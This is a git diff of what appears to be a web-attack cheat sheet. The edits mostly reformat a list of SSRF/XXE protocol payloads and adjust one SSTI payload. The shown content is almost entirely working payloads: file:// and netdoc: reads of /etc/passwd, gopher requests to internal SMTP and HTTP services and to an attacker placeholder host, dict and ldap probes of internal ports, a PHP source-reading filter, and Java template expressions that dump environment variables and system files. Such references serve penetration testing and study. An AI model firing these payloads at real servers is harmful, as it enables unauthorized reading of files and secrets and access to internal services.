@@ -343,43 +343,58 @@ If the output of the `win.ini` file on the target returns the response message, 
 ### Exploitable Protocols
 
 File: could be used to read local file on the server
-	`file:///etc/passwd`
+	
+	file:///etc/passwd
 
 HTTP(s): useful in OOB Data Exfiltration
-	`http(s)://securityidiots.com/lol.xml`
+	
+	http(s)://securityidiots.com/lol.xml
 
 FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
-	`ftp://securityidiots.com/lol.xml`
+	
+	ftp://securityidiots.com/lol.xml
 
 SFTP: hitting the internal SFTP service which is behind NAT
-	`sftp://securityidiots.com:11111/`
+	
+	sftp://securityidiots.com:11111/
 
 TFTP: hitting the internal TFTP service which is behind NAT
-	`tftp://securityidiots.com:12346/lol.xml`
+	
+	tftp://securityidiots.com:12346/lol.xml
 
 DICT : could also be used to make requests to internal services
-	`dict://ip:22/_XXX`
-	`dict://ip:6379/_XXX`
+	
+	dict://ip:22/_XXX
+	
+	dict://ip:6379/_XXX
 
 NETDOC: This could be used as an alternative to file in JAVA based Servers.
-	`netdoc:/etc/passwd`
+	
+	netdoc:/etc/passwd
 
 LDAP: could be used to query internal LDAP Service.
-	`ldap://localhost:11211/%0astats%0aquit`
+	
+	ldap://localhost:11211/%0astats%0aquit
 
 GOPHER:
-	`gopher://<host>:<port>/_<gopher-path>`
-	`gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)`
+	
+	gopher://<host>:<port>/_<gopher-path>
 
-	Making internal HTTP Requests(GET,POST..etc):
-	`gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A`
-	`gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body`
+	gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)
+
+Making internal HTTP Requests(GET,POST..etc):
+
+	gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+	
+	gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
 
 PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
-	`php://filter/convert.base64-encode/resource=index.php`
+	
+	php://filter/convert.base64-encode/resource=index.php
 
 Data:
-	`data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`
+	
+	data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk
 	
 --------------------------------------------------------------------------------------------------------------
 # Server Side Template Injection (SSTI)
@@ -401,7 +416,7 @@ ${7*7}
 ${{7*7}}
 ${class.getClassLoader()}
 ${class.getResource("").getPath()}
-${class.getResource("../../../../../index.htm").getContent()}
+${class.getResource("../../../../../index.html").getContent()}
 ${T(java.lang.System).getenv()}
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
 ```
